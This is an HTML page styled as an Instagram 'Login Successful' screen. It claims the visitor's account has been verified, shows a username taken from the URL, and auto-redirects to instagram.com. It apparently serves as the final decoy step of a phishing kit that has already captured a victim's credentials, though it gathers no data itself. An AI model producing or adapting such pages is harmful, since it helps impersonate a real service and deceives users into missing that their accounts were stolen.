<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            color: #4CAF50;
            font-size: 2.5em;
        }

        p {
            color: #555;
            font-size: 1.2em;
            margin: 20px 0;
        }

        #username {
            color: #4CAF50;
            font-weight: bold;
        }

        .redirect-msg {
            margin: 30px 0;
            font-size: 1.1em;
            color: #333;
        }

        .link-btn {
            display: inline-block;
            padding: 12px 25px;
            background-color: #4CAF50;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 1.1em;
            transition: background-color 0.3s;
        }

        .link-btn:hover {
            background-color: #45a049;
        }

        .footer {
            margin-top: 20px;
            font-size: 0.9em;
            color: #777;
        }

        .footer a {
            color: #4CAF50;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login Successful!</h1>
        <p>Welcome, <span id="username"></span>!</p>
        <p>Your Instagram account has been verified successfully.</p>

        <div class="redirect-msg">
            <p>Redirecting you to Instagram in a moment...</p>
            <meta http-equiv="refresh" content="3;url=https://www.instagram.com">
        </div>

        <a href="https://www.instagram.com" class="link-btn" target="_blank">Go to Instagram</a>

        <div class="footer">
            <p>Having trouble? <a href="https://www.instagram.com" target="_blank">Visit Instagram's website</a> for help.</p>
        </div>
    </div>

    <script>
        // Get username from URL parameter and display it
        var urlParams = new URLSearchParams(window.location.search);
        var username = urlParams.get('username');
        document.getElementById("username").textContent = username;
    </script>
</body>
</html>
